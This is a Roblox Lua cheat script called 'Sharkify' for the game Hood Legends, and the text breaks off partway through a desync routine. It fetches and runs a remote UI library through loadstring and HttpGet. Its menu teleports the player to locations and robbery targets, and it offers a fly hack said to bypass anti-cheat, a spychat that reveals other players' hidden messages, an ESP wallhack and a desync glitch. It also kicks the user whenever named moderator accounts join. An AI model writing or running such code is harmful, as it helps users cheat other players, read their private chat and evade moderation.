local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()


local LocalPlayer = game.Players.LocalPlayer
       local Players = game:GetService("Players")
       
       
       Players.PlayerAdded:Connect(function(player)
         if player.Name == "doubledday1" or player.Name == "scraifi" or player.Name == "revtype" or player.Name == "XxAsianMoonxX" or player.Name == "dtbvalhalla"  or player.Name == "4PFeds"
       then
         LocalPlayer:Kick(player.name .. "joined the game, kicking to prevent ban.")
         end
       end)






local Window = Rayfield:CreateWindow({
    Name = "Sharkify",
    LoadingTitle = "Rayfield Interface Suite",
    LoadingSubtitle = "by Sirius",
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Big Hub"
    },
    Discord = {
       Enabled = false,
       Invite = "https://discord.gg/vW7sFCfxMT", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "SharkifyV3",
       Subtitle = "Key System",
       Note = "ask shark!#0001 on discord",
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"1"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })

 local Tab = Window:CreateTab("hood legends tp's", 4483362458) -- Title, Image 

 local Section = Tab:CreateSection("teleports")

local Button = Tab:CreateButton({
    Name = "bank",
    Callback = function()
      local CF = CFrame.new(202.302124, -4.99999619, 146.552017)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end, 
 })


local Button = Tab:CreateButton({
   Name = "click me! ` you wont be kicked as much.",
   Callback = function()
   local a
while task.wait() do
pcall(function()
a = game[setmetatable({},{__eq = function()
game:GetService("Players").LocalPlayer:Kick("Detected")
return true
end
})]
end)
end

   end,
})






 local Button = Tab:CreateButton({
    Name = "barber shop",
    Callback = function()
        local CF = CFrame.new(-149.7341, -5.62775612, -191.261307)
        local Speed = 164 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
      end,
   }) 
   
 










 local Button = Tab:CreateButton({
    Name = "gunStore1",
    Callback = function()
      local CF = CFrame.new(-119.416344, -7.88400316, 363.994293)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 }) 

 local Button = Tab:CreateButton({
    Name = "gunStore2",
    Callback = function()
      local CF = CFrame.new(-90.6663361, -7.88400173, -206.505707)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

local Label = Tab:CreateLabel(".")

 local Button = Tab:CreateButton({
    Name = "LMG",
    Callback = function()
        local CF = CFrame.new(346.419495, -4.77815437, 245.625809)
        local Speed = 164 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
      end,
   }) 
   
  
    
 





 local Button = Tab:CreateButton({
    Name = "police",
    Callback = function()
      local CF = CFrame.new(77.2311478, -2.46740699, 566.544617)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 }) -- 



 local Button = Tab:CreateButton({
   Name = "gas",
   Callback = function()
      local CF = CFrame.new(-272.184998, -1.94500065, -322.059998)
      local Speed = 172 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
   end,
})


local Button = Tab:CreateButton({
   Name = "gym",
   Callback = function()
      local CF = CFrame.new(65.6770401, -6.33758354, -189.565735)
      local Speed = 172 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
   end,
})


local Label = Tab:CreateLabel(".")




 local Button = Tab:CreateButton({
    Name = "foodstore1",
    Callback = function()
      local CF = CFrame.new(228.735092, -6.16392612, 19.28512)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "foodstore2",
    Callback = function()
      local CF = CFrame.new(-204.929443, -15.8232813, 485.464539)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "church",
    Callback = function()
      local CF = CFrame.new(-92.4350128, -17.2000008, 489.06500)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "casino",
    Callback = function()
      local CF = CFrame.new(631.710632, 5.02451897, -35.6979523)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })



 local Button = Tab:CreateButton({
    Name = "medkit",
    Callback = function()
        local CF = CFrame.new(306.56665, -5.04058313, 355.075439)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })

local Label = Tab:CreateLabel(".")


 local Button = Tab:CreateButton({
    Name = "shoe store",
    Callback = function()
      local CF = CFrame.new(-204.309998, -4.05699968, 189.087952)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "bike",
    Callback = function()
      local CF = CFrame.new(-393.934937, -8.82500172, 10.5650024)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "flame",
    Callback = function()
      local CF = CFrame.new(123.5914, 12.875, 593.137756)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "rpg",
    Callback = function()
      local CF = CFrame.new(473.27359, -15.5366259, -218.845993)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })



 local Label = Tab:CreateLabel("armors!")





 local Button = Tab:CreateButton({
    Name = "armor 1",
    Callback = function()
        local CF = CFrame.new(-260.786377, -6.15818882, -184.313858)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })


 local Button = Tab:CreateButton({
    Name = "armor 2",
    Callback = function()
        local CF = CFrame.new(-120.508865, -16.3789005, 466.647736)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })


 local Button = Tab:CreateButton({
    Name = "armor 3",
    Callback = function()
        local CF = CFrame.new(266.570007, -21.1727352, -306.309814)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })


 local Button = Tab:CreateButton({
    Name = "armor 4",
    Callback = function()
        local CF = CFrame.new(547.131042, 3.81238079, 155.762054)
        local Speed = 183 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })



 local Label = Tab:CreateLabel("inside buildings")


 local Button = Tab:CreateButton({
    Name = "corner store",
    Callback = function()
        local CF = CFrame.new(-123.930038, -5.89548397, -87.3325272)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })










 local Button = Tab:CreateButton({
    Name = "movie",
    Callback = function()
        local CF = CFrame.new(663.662109, 3.67234254, 163.350189)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })

 local Button = Tab:CreateButton({
    Name = "police (gunroom)",
    Callback = function()
        local CF = CFrame.new(67.8200607, -4.33627701, 596.699097)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })


 local Button = Tab:CreateButton({
    Name = "police (cells)",
    Callback = function()
        local CF = CFrame.new(10.9009142, -4.41348457, 574.155334)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })



 local Button = Tab:CreateButton({
    Name = "warehouse",
    Callback = function()
        local CF = CFrame.new(-400.979797, -5.89353609, -85.0423889)
        local Speed = 170 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })








 local Label = Tab:CreateLabel("hiding spots (NOTE THIS MIGHT GET YOU KICKED)")



 local Button = Tab:CreateButton({
    Name = "hiding spot 1",
    Callback = function()
        local CF = CFrame.new(635.141663, 4.15472269, 143.527115)
        local Speed = 161 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })






 local Button = Tab:CreateButton({
    Name = "hiding spot 2",
    Callback = function()
        local CF = CFrame.new(-18.995924, 40.287159, 689.804199)
        local Speed = 202 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })


 local Button = Tab:CreateButton({
    Name = "hiding spot 3",
    Callback = function()
        local CF = CFrame.new(667.855225, 92.8449707, 81.2711639)
        local Speed = 201 --Studs Per Second
        
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        
        TweenService:Create(
            (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
            TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
            {CFrame = CF}
        ):Play()
        
        
    end,
 })






 local Section = Tab:CreateSection("heist dropoffs + rob")


 local Button = Tab:CreateButton({
    Name = "rob bank",
    Callback = function()
      local CF = CFrame.new(148.399841, -36.5499191, 125.323608)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })


 local Button = Tab:CreateButton({
   Name = "buy Dynamite",
   Callback = function()
      local CF = CFrame.new(240.502014, -6.79997969, 198.672104)
      local Speed = 170 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
   end,
})






 local Button = Tab:CreateButton({
    Name = "rob diamond",
    Callback = function()
      local CF = CFrame.new(-295.634338, 3.54998708, 244.314774)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })

 local Button = Tab:CreateButton({
    Name = "bank dropoff",
    Callback = function()
      local CF = CFrame.new(197.565002, -2.95000172, 139.815018)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })


 local Button = Tab:CreateButton({
    Name = "diamond dropoff",
    Callback = function()
      local CF = CFrame.new(-235.684998, -4.95000172, -88.1849213)
      local Speed = 164 --Studs Per Second
      
      local Players = game:GetService("Players")
      local TweenService = game:GetService("TweenService")
      
      TweenService:Create(
          (Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 9e9),
          TweenInfo.new(Players.LocalPlayer:DistanceFromCharacter(CF.Position)/Speed, Enum.EasingStyle.Linear),
          {CFrame = CF}
      ):Play()
      
      
    end,
 })


-- end 



local Tab = Window:CreateTab("main scripts for hoodLegends", 4483362458) -- Title, Image


local Section = Tab:CreateSection("main")


local Button = Tab:CreateButton({
   Name = "fly (bypasses anticheat L)",
   Callback = function()
      local player = game.Players.LocalPlayer 
      local mouse = player:GetMouse() 
      local flying = false 
      local speed = 180 -- speed fr
      
     
      local function toggle()
          flying = not flying 
          if flying then 
              player.Character.Humanoid.PlatformStand = true 
              local bodyVel = Instance.new("BodyVelocity", player.Character.HumanoidRootPart) 
              bodyVel.Name = "FlyVelocity" 
              bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge) 
              bodyVel.Velocity = Vector3.new(0, 0.1, 0) -- z
              
              mouse.Move:Connect(function()
                  
                  bodyVel.Velocity = (mouse.Hit.p - player.Character.HumanoidRootPart.Position).Unit * speed
              end)
          else -- If flying is false
              player.Character.Humanoid.PlatformStand = false -- Make the character stop standing on a platform
              player.Character.HumanoidRootPart:FindFirstChild("FlyVelocity"):Destroy()
          end
      end
      
      -- Connect a function to the mouse's KeyDown event
      mouse.KeyDown:Connect(function(key)
          if key == "l" then -- If the key pressed is L
              toggle() -- Call the toggle function
          end
      end)
   end,
})





-- very old spychat used for years i think lol

local Button = Tab:CreateButton({
   Name = "spychat",
   Callback = function()
   --This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = true

spyOnMyself = true

public = false

publicItalics = true

privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

   end,
})




 
 local Label = Tab:CreateLabel(".")

local Button = Tab:CreateButton({
   Name = "player esp (E)",
   Callback = function()
   
-- Press E to toggle

local plrs = game:GetService("Players")
local lplr = plrs.LocalPlayer
local mouse = lplr:GetMouse()
local camera = game:GetService("Workspace").CurrentCamera

local espEnabled = false

local function createESP(plr)
    local name = Drawing.new("Text")
    name.Text = plr.Name
    name.Size = 35
    name.Color = Color3.fromRGB(67, 84, 147)
    name.Center = true
    name.Outline = true
    name.OutlineColor = Color3.fromRGB(0, 0, 0)
    name.Visible = false

    local distance = Drawing.new("Text")
    distance.Text = "0"
    distance.Size = 24
    distance.Color = Color3.fromRGB(205, 84, 75)
    distance.Center = true
    distance.Outline = true
    distance.OutlineColor = Color3.fromRGB(0, 0, 0)
    distance.Visible = false

    local box = Drawing.new("Square")
    box.Color = Color3.fromRGB(123, 182, 232)
    box.Thickness = 2
    box.Filled = false
    box.Visible = false

    local function update()
        local cframe = camera.CFrame.p
        local pos = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.HumanoidRootPart.Position
        if pos and plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
            local vector, onScreen = camera:WorldToViewportPoint(pos)
            if onScreen then
                local sizeX = plr.Character.HumanoidRootPart.Size.X / 2
                local sizeY = plr.Character.HumanoidRootPart.Size.Y / 2

                local topLeft = camera:WorldToViewportPoint((pos + Vector3.new(-sizeX, sizeY + 1.5, 0)))
                local topRight = camera:WorldToViewportPoint((pos + Vector3.new(sizeX, sizeY + 1.5, 0)))
                local bottomLeft = camera:WorldToViewportPoint((pos + Vector3.new(-sizeX, -sizeY - 1.5, 0)))
                local bottomRight = camera:WorldToViewportPoint((pos + Vector3.new(sizeX, -sizeY - 1.5, 0)))

                name.Position = Vector2.new(vector.X, vector.Y - (topLeft.Y - bottomLeft.Y) / 2 - name.TextBounds.Y / 2)
                name.Visible = espEnabled

                distance.Position = Vector2.new(vector.X, vector.Y + (topLeft.Y - bottomLeft.Y) / 2 + distance.TextBounds.Y / 2)
                distance.Text = math.floor((cframe - pos).Magnitude) .. " studs"
                distance.Visible = espEnabled

                box.PointA = Vector2.new(topLeft.X, topLeft.Y)
                box.PointB = Vector2.new(topRight.X, topRight.Y)
                box.PointC = Vector2.new(bottomRight.X, bottomRight.Y)
                box.PointD = Vector2.new(bottomLeft.X, bottomLeft.Y)
                box.Visible = espEnabled
            else
                name.Visible = false
                distance.Visible = false
                box.Visible = false
            end
        else
            name.Visible = false
            distance.Visible = false
            box.Visible = false
        end
    end

    game:GetService("RunService").RenderStepped:Connect(update)

end

for i,v in pairs(plrs:GetPlayers()) do
    if v ~= lplr then
        createESP(v)
    end
end

plrs.PlayerAdded:Connect(function(v)
    if v ~= lplr then
        createESP(v)
    end
end)

mouse.KeyDown:Connect(function(key)
    if key == "e" then -- change this to whatever key you want to toggle the esp with
        espEnabled = not espEnabled -- toggles the esp on or off when you press the key 
    end
end)
   end,
})


local Button = Tab:CreateButton({
   Name = "kick glitch (X)",
   Callback = function()
      local P1000ToggleKey = "x" -- Change that to whatever keybind: "t" 
   
      
      -- the streets thing i found months ago.
      --// Services
      checkcaller = checkcaller
      newcclosure = newcclosure
      hookmetamethod = hookmetamethod
      
      local PastedSources = false
      local BruhXD = game:GetService("RunService")
      local LocalPlayer = game:GetService("Players").LocalPlayer
      local Bullshit = LocalPlayer:GetMouse()
      
      
      --// Toggles
      Bullshit.KeyDown:Connect(function(SayNoToOblivity)
         if SayNoToOblivity == string.lower(P1000ToggleKey) then
            pcall(function()
               if PastedSources == false then
                  PastedSources = true
                  print("Enabled P1000")
               elseif PastedSources == true then
                  PastedSources = false
                  print("Disabled P1000")
               end
            end)
         end
      end)
      
      Bullshit.KeyDown:Connect(function(SayNoToOblivity)
         if SayNoToOblivity == ("=") then
            game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer) 
         end
      end)
      
      
      --// Desync_Source
      function RandomNumberRange(a)
         return math.random(-a * 100, a * 100) / 100
      end
      
      function RandomVectorRange(a, b, c)
         return Vector3.new(RandomNumberRange(a), RandomNumberRange(b), RandomNumberRange(c))
      end
      
      
      local DesyncTypes = {}
      BruhXD.Heartbeat:Connect(function()
         if PastedSources == true then
            DesyncTypes[1] = LocalPlayer.Character.HumanoidRootPart.CFrame
            DesyncTypes[2] = LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
      
            local SpoofThis = LocalPlayer.Character.HumanoidRootPart.CFrame
      
